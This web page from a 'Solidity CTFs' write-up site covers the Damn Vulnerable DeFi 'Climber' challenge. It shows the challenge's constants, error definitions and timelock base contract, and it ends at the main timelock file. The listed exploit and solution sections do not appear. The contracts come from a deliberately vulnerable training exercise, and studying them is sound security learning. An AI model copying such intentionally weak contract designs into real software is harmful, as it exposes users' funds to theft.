
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../11.%20Backdoor/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.6">
    
    
      
        <title>Climber - Solidity CTFs</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.558e4712.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#climber" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Solidity CTFs" class="md-header__button md-logo" aria-label="Solidity CTFs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Solidity CTFs
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Climber
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/dmtrbch/solidity-ctfs/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    dmtrbch/solidity-ctfs
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Solidity CTFs" class="md-nav__button md-logo" aria-label="Solidity CTFs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Solidity CTFs
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/dmtrbch/solidity-ctfs/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    dmtrbch/solidity-ctfs
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Welcome!
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
        <label class="md-nav__link" for="__nav_2" tabindex="0" aria-expanded="false">
          1. Ethernaut
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="1. Ethernaut" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          1. Ethernaut
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/01.%20Fallback/" class="md-nav__link">
        Fallback
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/02.%20Fallout/" class="md-nav__link">
        Fallout
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/03.%20Coin%20Flip/" class="md-nav__link">
        Coin Flip
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/04.%20Telephone/" class="md-nav__link">
        Telephone
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/05.%20Token/" class="md-nav__link">
        Token
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/06.%20Delegation/" class="md-nav__link">
        Delegation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/07.%20Force/" class="md-nav__link">
        Force
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/08.%20Vault/" class="md-nav__link">
        Vault
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/09.%20King/" class="md-nav__link">
        King
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/10.%20Re-entrancy/" class="md-nav__link">
        Re-entrancy
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/11.%20Elevator/" class="md-nav__link">
        Elevator
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/15.%20Naught%20Coin/" class="md-nav__link">
        Naught Coin
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/16.%20Preservation/" class="md-nav__link">
        Preservation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/17.%20Recovery/" class="md-nav__link">
        Recovery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/20.%20Denial/" class="md-nav__link">
        Denial
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/21.%20Shop/" class="md-nav__link">
        Shop
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/23.%20Dex%20Two/" class="md-nav__link">
        Dex Two
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/24.%20Puzzle%20Wallet/" class="md-nav__link">
        Puzzle Wallet
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../1.%20Ethernaut/25.%20Motorbike/" class="md-nav__link">
        Motorbike
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" tabindex="0" aria-expanded="false">
          2. Capture the Ether
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="2. Capture the Ether" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          2. Capture the Ether
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/01.%20Guess%20the%20number/" class="md-nav__link">
        Guess the number
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/02.%20Guess%20the%20secret%20number/" class="md-nav__link">
        Guess the secret number
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/03.%20Guess%20the%20random%20number/" class="md-nav__link">
        Guess the random number
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/04.%20Guess%20the%20new%20number/" class="md-nav__link">
        Guess the new number
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/05.%20Predict%20the%20future/" class="md-nav__link">
        Predict the future
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/06.%20Predict%20the%20block%20hash/" class="md-nav__link">
        Predict the block hash
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/07.%20Token%20sale/" class="md-nav__link">
        Token sale
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/08.%20Token%20whale/" class="md-nav__link">
        Token whale
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/09.%20Retirement%20fund/" class="md-nav__link">
        Retirement fund
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../2.%20Capture%20the%20Ether/10.%20Token%20bank/" class="md-nav__link">
        Token bank
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
      
      
      
        <label class="md-nav__link" for="__nav_4" tabindex="0" aria-expanded="true">
          3. Damn Vulnerable Defi
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="3. Damn Vulnerable Defi" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          3. Damn Vulnerable Defi
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../01.%20Unstoppable/" class="md-nav__link">
        Unstoppable
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../02.%20Naive%20receiver/" class="md-nav__link">
        Naive receiver
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../03.%20Truster/" class="md-nav__link">
        Truster
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../04.%20Side%20Entrance/" class="md-nav__link">
        Side Entrance
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../05.%20The%20Rewarder/" class="md-nav__link">
        The Rewarder
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../06.%20Selfie/" class="md-nav__link">
        Selfie
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../11.%20Backdoor/" class="md-nav__link">
        Backdoor
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Climber
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Climber
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#goal" class="md-nav__link">
    Goal
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacker-contract-code" class="md-nav__link">
    Attacker contract code
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution-code" class="md-nav__link">
    Solution code
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#goal" class="md-nav__link">
    Goal
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacker-contract-code" class="md-nav__link">
    Attacker contract code
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution-code" class="md-nav__link">
    Solution code
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  



<h1 id="climber">Climber</h1>
<p>ClimberConstants.sol</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span><span class="w"> </span><span class="n">MIT</span>
<span class="n">pragma</span><span class="w"> </span><span class="n">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8</span><span class="o">.</span><span class="mi">0</span><span class="p">;</span>

<span class="o">/*</span><span class="w"> </span><span class="c1">########################## */</span>
<span class="o">/*</span><span class="w"> </span><span class="c1">### TIMELOCK CONSTANTS ### */</span>
<span class="o">/*</span><span class="w"> </span><span class="c1">########################## */</span>

<span class="o">//</span><span class="w"> </span><span class="n">keccak256</span><span class="p">(</span><span class="s2">&quot;ADMIN_ROLE&quot;</span><span class="p">);</span>
<span class="n">bytes32</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">ADMIN_ROLE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775</span><span class="p">;</span>

<span class="o">//</span><span class="w"> </span><span class="n">keccak256</span><span class="p">(</span><span class="s2">&quot;PROPOSER_ROLE&quot;</span><span class="p">);</span>
<span class="n">bytes32</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">PROPOSER_ROLE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1</span><span class="p">;</span>

<span class="n">uint256</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">MAX_TARGETS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span>
<span class="n">uint256</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">MIN_TARGETS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="n">uint256</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">MAX_DELAY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">days</span><span class="p">;</span>

<span class="o">/*</span><span class="w"> </span><span class="c1">####################### */</span>
<span class="o">/*</span><span class="w"> </span><span class="c1">### VAULT CONSTANTS ### */</span>
<span class="o">/*</span><span class="w"> </span><span class="c1">####################### */</span>

<span class="n">uint256</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">WITHDRAWAL_LIMIT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ether</span><span class="p">;</span>
<span class="n">uint256</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="n">WAITING_PERIOD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">15</span><span class="w"> </span><span class="n">days</span><span class="p">;</span>
</code></pre></div>

<p>ClimberErrors.sol</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="n">pragma</span><span class="w"> </span><span class="n">solidity</span><span class="w"> </span>^<span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nb">error</span><span class="w"> </span><span class="n">CallerNotTimelock</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">NewDelayAboveMax</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">NotReadyForExecution</span><span class="p">(</span><span class="n">bytes32</span><span class="w"> </span><span class="n">operationId</span><span class="p">);</span>
<span class="nb">error</span><span class="w"> </span><span class="n">InvalidTargetsCount</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">InvalidDataElementsCount</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">InvalidValuesCount</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">OperationAlreadyKnown</span><span class="p">(</span><span class="n">bytes32</span><span class="w"> </span><span class="n">operationId</span><span class="p">);</span>
<span class="nb">error</span><span class="w"> </span><span class="n">CallerNotSweeper</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">InvalidWithdrawalAmount</span><span class="p">();</span>
<span class="nb">error</span><span class="w"> </span><span class="n">InvalidWithdrawalTime</span><span class="p">();</span>
</code></pre></div>

<p>ClimberTimelockBase.sol</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kn">import</span> <span class="s2">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span><span class="p">;</span>

<span class="o">/**</span>
 <span class="o">*</span> <span class="nd">@title</span> <span class="n">ClimberTimelockBase</span>
 <span class="o">*</span> <span class="nd">@author</span> <span class="n">Damn</span> <span class="n">Vulnerable</span> <span class="n">DeFi</span> <span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">damnvulnerabledefi</span><span class="o">.</span><span class="n">xyz</span><span class="p">)</span>
 <span class="o">*/</span>
<span class="n">abstract</span> <span class="n">contract</span> <span class="n">ClimberTimelockBase</span> <span class="ow">is</span> <span class="n">AccessControl</span> <span class="p">{</span>
    <span class="o">//</span> <span class="n">Possible</span> <span class="n">states</span> <span class="k">for</span> <span class="n">an</span> <span class="n">operation</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">timelock</span> <span class="n">contract</span>
    <span class="n">enum</span> <span class="n">OperationState</span> <span class="p">{</span>
        <span class="n">Unknown</span><span class="p">,</span>
        <span class="n">Scheduled</span><span class="p">,</span>
        <span class="n">ReadyForExecution</span><span class="p">,</span>
        <span class="n">Executed</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Operation</span> <span class="n">data</span> <span class="n">tracked</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">contract</span>
    <span class="n">struct</span> <span class="n">Operation</span> <span class="p">{</span>
        <span class="n">uint64</span> <span class="n">readyAtTimestamp</span><span class="p">;</span> <span class="o">//</span> <span class="n">timestamp</span> <span class="n">at</span> <span class="n">which</span> <span class="n">the</span> <span class="n">operation</span> <span class="n">will</span> <span class="n">be</span> <span class="n">ready</span> <span class="k">for</span> <span class="n">execution</span>
        <span class="nb">bool</span> <span class="n">known</span><span class="p">;</span> <span class="o">//</span> <span class="n">whether</span> <span class="n">the</span> <span class="n">operation</span> <span class="ow">is</span> <span class="n">registered</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">timelock</span>
        <span class="nb">bool</span> <span class="n">executed</span><span class="p">;</span> <span class="o">//</span> <span class="n">whether</span> <span class="n">the</span> <span class="n">operation</span> <span class="n">has</span> <span class="n">been</span> <span class="n">executed</span>
    <span class="p">}</span>

    <span class="o">//</span> <span class="n">Operations</span> <span class="n">are</span> <span class="n">tracked</span> <span class="n">by</span> <span class="n">their</span> <span class="n">bytes32</span> <span class="n">identifier</span>
    <span class="n">mapping</span><span class="p">(</span><span class="n">bytes32</span> <span class="o">=&gt;</span> <span class="n">Operation</span><span class="p">)</span> <span class="n">public</span> <span class="n">operations</span><span class="p">;</span>

    <span class="n">uint64</span> <span class="n">public</span> <span class="n">delay</span><span class="p">;</span>

    <span class="n">function</span> <span class="n">getOperationState</span><span class="p">(</span><span class="n">bytes32</span> <span class="nb">id</span><span class="p">)</span> <span class="n">public</span> <span class="n">view</span> <span class="n">returns</span> <span class="p">(</span><span class="n">OperationState</span> <span class="n">state</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Operation</span> <span class="n">memory</span> <span class="n">op</span> <span class="o">=</span> <span class="n">operations</span><span class="p">[</span><span class="nb">id</span><span class="p">];</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">op</span><span class="o">.</span><span class="n">known</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">op</span><span class="o">.</span><span class="n">executed</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">state</span> <span class="o">=</span> <span class="n">OperationState</span><span class="o">.</span><span class="n">Executed</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">&lt;</span> <span class="n">op</span><span class="o">.</span><span class="n">readyAtTimestamp</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">state</span> <span class="o">=</span> <span class="n">OperationState</span><span class="o">.</span><span class="n">Scheduled</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">state</span> <span class="o">=</span> <span class="n">OperationState</span><span class="o">.</span><span class="n">ReadyForExecution</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">state</span> <span class="o">=</span> <span class="n">OperationState</span><span class="o">.</span><span class="n">Unknown</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">function</span> <span class="n">getOperationId</span><span class="p">(</span>
        <span class="n">address</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">targets</span><span class="p">,</span>
        <span class="n">uint256</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">values</span><span class="p">,</span>
        <span class="nb">bytes</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">dataElements</span><span class="p">,</span>
        <span class="n">bytes32</span> <span class="n">salt</span>
    <span class="p">)</span> <span class="n">public</span> <span class="n">pure</span> <span class="n">returns</span> <span class="p">(</span><span class="n">bytes32</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">keccak256</span><span class="p">(</span><span class="n">abi</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">targets</span><span class="p">,</span> <span class="n">values</span><span class="p">,</span> <span class="n">dataElements</span><span class="p">,</span> <span class="n">salt</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="n">receive</span><span class="p">()</span> <span class="n">external</span> <span class="n">payable</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>ClimberTimelock.sol</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
<span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

